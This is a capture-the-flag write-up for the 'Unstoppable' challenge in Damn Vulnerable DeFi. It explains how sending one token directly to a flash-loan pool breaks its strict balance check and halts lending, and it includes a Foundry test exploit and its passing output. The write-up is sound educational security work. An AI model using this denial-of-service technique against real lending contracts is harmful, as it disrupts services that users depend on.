#	Damn Vulnerable DeFi (Foundry version)
- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

##	Challenge #1 - Unstoppable - Description

There's a lending pool with a million DVT tokens in balance, offering flash loans for free.

If only there was a way to attack and stop the pool from offering flash loans ...

You start with 100 DVT tokens in balance.

##  Scope

| File Name                                                                      | SHA-1 Hash                               |
| ------------------------------------------------------------------------------ | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/unstoppable/ReceiverUnstoppable.sol | a0250b77e1e331d49084f5829af77788a02eea7b |
| damn-vulnerable-defi-foundry/src/Contracts/unstoppable/UnstoppableLender.sol   | 363dfce7ea33163505a3232fe277be6910b3df0f |

##  Plan

From the description we can make the assumption that we must break the contract (DOS?). We can start looking for [assert-and-require][].

[assert-and-require]: https://docs.soliditylang.org/en/v0.8.12/control-structures.html#assert-and-require

-   The convenience functions assert and require can be used to check for conditions and throw an exception if the condition is not met.

-   The assert function creates an error of type Panic(uint256). Assert should only be used to test for internal errors, and to check invariants.

-   The require function either creates an error without any data or an error of type Error(string). It should be used to ensure valid conditions that cannot be detected until execution time. This includes conditions on inputs or return values from calls to external contracts.

There are no `require` but there is one `error AssertionViolated()` in:
https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/unstoppable/UnstoppableLender.sol#L41

```solidity
if (poolBalance != balanceBefore) revert AssertionViolated();
```

The error is giving us a hint that points to [SWC-110: Assert Violation](https://swcregistry.io/docs/SWC-110):
-   assert() function is meant to assert invariants. Properly functioning code should never reach a failing assert statement. A reachable assertion can mean one of two things:
    1.  A bug exists in the contract that allows it to enter an invalid state;
    2.  The assert statement is used incorrectly, e.g. to validate inputs.

There are [six ways that two smart contracts can interact](https://github.com/Luker501/SmartContractInteractions). Three of them can send/transfer ether:
1.  Send
2.  Transfer
3.  Self Destruct

To reach the failing assert statement we can do something like [SWC-132: Unexpected Ether balance](https://swcregistry.io/docs/SWC-132):
-   Contracts can behave erroneously when they strictly assume a specific Ether balance. It is always possible to forcibly send ether to a contract (without triggering its fallback function), using selfdestruct, or by mining to the account. In the worst case scenario `this could lead to DOS conditions that might render the contract unusable`.

## Solution

<details>
    <summary>Description</summary>

Send 1 token to the Lending Pool directly.

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/unstoppable/Unstoppable.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lender");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 1);
        vm.stopPrank();
        /** EXPLOIT END **/
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
```
</details>

### Proof of Concept

```
./run.sh 1
[⠃] Compiling...
[⠒] Compiling 1 files with 0.8.12
[⠘] Solc 0.8.12 finished in 1.60s
Compiler run successful

Running 1 test for test/Levels/unstoppable/Unstoppable.t.sol:Unstoppable
[PASS] testExploit() (gas: 45480)
Logs:
  🧨 PREPARED TO BREAK THINGS 🧨

Test result: ok. 1 passed; 0 failed; finished in 3.55ms
```